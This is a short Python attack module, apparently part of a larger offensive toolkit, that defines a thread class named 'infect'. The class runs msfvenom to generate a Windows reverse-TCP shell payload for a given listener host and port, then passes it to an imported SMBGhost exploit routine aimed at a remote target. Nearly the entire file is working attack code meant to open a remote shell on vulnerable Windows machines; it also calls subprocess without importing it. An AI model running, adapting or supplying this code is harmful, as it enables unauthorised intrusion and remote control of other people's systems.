import binascii
import threading
import armory.SMBGhost.exploit as exploit


class infect(threading.Thread):
    
    def __init__(self, rhost, rport, lhost, lport):
        self.rhost=rhost
        self.rport=rport
        self.lhost=lhost
        self.lport=lport
        super().__init__()
        
    def run(self):
        self.inject()
        
    def generate_windows_shellcode(self,lhost, lport, arch="x64"):
        print("Generating Shellcode %s with lhost %s and lport %s" % (arch, lhost, lport))

        if (arch == "x64"):
            msf_payload = "windows/x64/shell_reverse_tcp"
        else:
            msf_payload = "windows/shell_reverse_tcp"
        # generate the msfvenom command
        msf_command = 'msfvenom -p ' + msf_payload + ' '
        msf_command += "LHOST=" + lhost + " LPORT=" + str(lport)
        # add final part to command to narrow down the msf output
        msf_command += " -f hex"

        # Run the command and get output
        print("MSF command ->", msf_command)

        return bytes.fromhex((subprocess.check_output(msf_command, shell=True).decode('ascii')))
    
    def inject(self):
        shell = self.generate_windows_shellcode(self.lhost,self.lport)
        result = exploit.exploit_SMBGhost(self.rhost, self.rport, shell)